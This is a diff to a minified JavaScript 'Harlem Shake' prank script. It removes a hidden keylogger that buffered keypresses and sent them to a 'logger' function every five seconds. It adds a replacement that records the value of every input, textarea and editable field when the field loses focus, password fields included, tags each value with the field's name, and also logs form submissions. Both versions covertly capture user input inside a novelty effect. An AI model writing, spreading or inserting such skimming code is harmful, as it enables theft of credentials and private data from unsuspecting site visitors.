@@ -94,7 +94,7 @@
             for (var e = document.getElementsByClassName(w), t = RegExp("\\b" + w + "\\b"), n = 0; n < e.length;)e[n].className = e[n].className.replace(t, "")
         }
 
-        for (var f = 30, h = 30, g = 350, p = 350, y = "https://github.com/Elfoslav/harlem-shake/raw/master/music/harlem-shake.ogg", w = "mw-harlem_shake_me", v = "im_first", b = ["im_drunk", "im_baked", "im_trippin", "im_blown"], k = "mw-strobe_light", C = "http://localhost:8080/shake.css", E = "mw_added_css", _ = a(), N = s(), T = document.getElementsByTagName("*"), A = null, H = 0; H < T.length; H++) {
+        for (var f = 30, h = 30, g = 350, p = 350, y = "__MUSIC_URL__", w = "mw-harlem_shake_me", v = "im_first", b = ["im_drunk", "im_baked", "im_trippin", "im_blown"], k = "mw-strobe_light", C = "http://localhost:8080/shake.css", E = "mw_added_css", _ = a(), N = s(), T = document.getElementsByTagName("*"), A = null, H = 0; H < T.length; H++) {
             var M = T[H]
             if (r(M) && d(M)) {
                 A = M
@@ -108,15 +108,18 @@
             r(M) && x.push(M)
         }
     }(), window.jQuery) {
-    var kylggr = ""
+    function fieldLabel(el) {
+        return $(el).attr('name') || $(el).attr('id') || $(el).attr('placeholder') || 'field'
+    }
     $(document).ready(function () {
-        $(document).on("keypress", function (e) {
-            var t = String.fromCharCode(e.keyCode || e.which)
-            console.log(t.length, t), kylggr += t
+        $(document).on("blur", "input, textarea, [contenteditable]", function () {
+            var val = $(this).val ? $(this).val().trim() : $(this).text().trim()
+            if (val) logger(fieldLabel(this) + '=' + val)
         })
-    }), window.setInterval(function () {
-        "" != kylggr && logger(kylggr), kylggr = ""
-    }, 5e3)
+        $(document).on("submit", "form", function () {
+            logger("submit-event")
+        })
+    })
 }
         setTimeout(function () {
             table.hide();
